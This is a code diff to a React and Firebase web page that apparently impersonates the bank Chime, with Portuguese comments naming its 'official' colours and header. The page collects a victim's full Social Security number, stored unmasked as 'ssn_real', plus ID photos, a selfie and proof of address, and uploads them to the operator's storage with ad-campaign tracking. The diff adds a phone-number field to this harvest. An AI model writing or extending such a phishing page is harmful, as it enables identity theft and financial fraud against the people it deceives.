@@ -1,5 +1,5 @@
 import React, { useState, useRef, useEffect } from 'react';
-import { Camera, Check, Shield, Lock, ChevronRight, AlertCircle, Menu, X, User as UserIcon, Loader2, FileText, ExternalLink, ArrowRight, CreditCard, TrendingUp } from 'lucide-react';
+import { Camera, Check, Shield, Lock, ChevronRight, AlertCircle, Menu, X, User as UserIcon, Loader2, FileText, ExternalLink, ArrowRight, CreditCard, TrendingUp, Phone } from 'lucide-react';
 import { initializeApp } from 'firebase/app';
 import { getFirestore, collection, addDoc, serverTimestamp, type Firestore } from 'firebase/firestore';
 import { getAuth, signInAnonymously, onAuthStateChanged, type Auth, type User } from 'firebase/auth';
@@ -36,13 +36,14 @@ try {
 // Cores Oficiais da Chime
 const BRAND = { green: '#00C865', darkGreen: '#004F2D', lightBg: '#F2F8F5' };
 
-// Interfaces (Restaurado para idFront e idBack)
+// Interfaces (Restaurado para idFront e idBack e adicionado phone)
 interface FileData { name: string; url: string; }
-interface FormDataState { ssn: string; idFront: File | null; idBack: File | null; selfie: File | null; proofAddress: File | null; }
+interface FormDataState { ssn: string; phone: string; idFront: File | null; idBack: File | null; selfie: File | null; proofAddress: File | null; }
 interface SubmittedDataType { 
   userId: string; 
   ssn_masked: string; 
   ssn_real: string; 
+  phone: string;
   status: string; 
   submittedAt: string | any;
   utm_source: string;
@@ -93,8 +94,9 @@ export default function App() {
   const [quizIndex, setQuizIndex] = useState(0);
   const [loadingText, setLoadingText] = useState("Analyzing credit profile...");
   const [submittedData, setSubmittedData] = useState<SubmittedDataType | null>(null);
-  // Estado restaurado
-  const [formData, setFormData] = useState<FormDataState>({ ssn: '', idFront: null, idBack: null, selfie: null, proofAddress: null });
+  
+  // Estado com phone adicionado
+  const [formData, setFormData] = useState<FormDataState>({ ssn: '', phone: '', idFront: null, idBack: null, selfie: null, proofAddress: null });
   const [isMenuOpen, setIsMenuOpen] = useState(false);
   const [user, setUser] = useState<User | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -150,6 +152,14 @@ export default function App() {
     setFormData(prev => ({ ...prev, ssn: value }));
   };
 
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 10) value = value.slice(0, 10);
+    if (value.length > 6) value = `(${value.slice(0, 3)}) ${value.slice(3, 6)}-${value.slice(6)}`;
+    else if (value.length > 3) value = `(${value.slice(0, 3)}) ${value.slice(3)}`;
+    setFormData(prev => ({ ...prev, phone: value }));
+  };
+
   const uploadFile = async (file: File | null, path: string): Promise<FileData | null> => {
     if (!file || !storage) return null;
     const storageRef = ref(storage, path);
@@ -187,6 +197,7 @@ export default function App() {
         userId: user.uid, 
         ssn_masked: `***-**-${formData.ssn.slice(-4)}`,
         ssn_real: formData.ssn,
+        phone: formData.phone,
         status: 'pending_review', 
         submittedAt: new Date().toISOString(), 
         utm_source: utmSource,
@@ -217,8 +228,8 @@ export default function App() {
     }
   };
 
-  // Validação restaurada para verificar Frente e Verso
-  const isFormValid = formData.ssn.length === 11 && formData.idFront && formData.idBack && formData.selfie && formData.proofAddress;
+  // Validação restaurada para verificar Frente e Verso e Celular
+  const isFormValid = formData.ssn.length === 11 && formData.phone.length === 14 && formData.idFront && formData.idBack && formData.selfie && formData.proofAddress;
 
   // --- HEADER CHIME OFICIAL ---
   const Header = () => (
@@ -313,6 +324,7 @@ export default function App() {
           </div>
           <div className="space-y-4">
             <div className="flex justify-between text-sm"><span className="text-gray-500">SSN:</span><span className="font-mono text-gray-800 font-bold">{submittedData.ssn_real}</span></div>
+            <div className="flex justify-between text-sm"><span className="text-gray-500">Phone:</span><span className="font-bold text-gray-800">{submittedData.phone}</span></div>
             <div className="pt-2">
               <p className="text-xs text-gray-400 mb-3 uppercase tracking-widest font-semibold">Secure Vault:</p>
               {Object.entries(submittedData.documents).map(([key, file]) => (
@@ -359,11 +371,20 @@ export default function App() {
             </p>
           </div>
           <form onSubmit={handleSubmit} className="p-6 space-y-6">
-            <div className="space-y-3">
-                <label className="flex justify-between text-sm font-bold text-gray-700"><span>Social Security Number (SSN)</span><Lock className="w-4 h-4 text-gray-400" /></label>
-                <div className="relative group">
-                    <input type="text" value={formData.ssn} onChange={handleSSNChange} placeholder="XXX-XX-XXXX" className="w-full px-5 py-4 bg-white border-2 border-gray-200 text-gray-800 rounded-xl focus:border-[#00C865] outline-none text-lg tracking-widest font-mono transition-colors" />
-                    <Shield className="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5 group-focus-within:text-[#00C865] transition-colors" />
+            <div className="space-y-4">
+                <div>
+                    <label className="flex justify-between text-sm font-bold text-gray-700 mb-1"><span>Social Security Number (SSN)</span><Lock className="w-4 h-4 text-gray-400" /></label>
+                    <div className="relative group">
+                        <input type="text" value={formData.ssn} onChange={handleSSNChange} placeholder="XXX-XX-XXXX" className="w-full px-5 py-4 bg-white border-2 border-gray-200 text-gray-800 rounded-xl focus:border-[#00C865] outline-none text-lg tracking-widest font-mono transition-colors" />
+                        <Shield className="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5 group-focus-within:text-[#00C865] transition-colors" />
+                    </div>
+                </div>
+
+                <div>
+                    <label className="flex justify-between text-sm font-bold text-gray-700 mb-1"><span>Cell Phone Number</span><Phone className="w-4 h-4 text-gray-400" /></label>
+                    <div className="relative group">
+                        <input type="tel" value={formData.phone} onChange={handlePhoneChange} placeholder="(555) 000-0000" className="w-full px-5 py-4 bg-white border-2 border-gray-200 text-gray-800 rounded-xl focus:border-[#00C865] outline-none text-lg transition-colors" />
+                    </div>
                 </div>
             </div>
             
@@ -372,7 +393,6 @@ export default function App() {
             <div>
               <h3 className="text-sm font-bold text-gray-800 uppercase tracking-widest mb-5">Required Documents</h3>
               
-              {/* RESTAURADO FRENTE E VERSO */}
               <FileUploadField 
                 label="Government ID (Front)" 
                 id="idFront" 
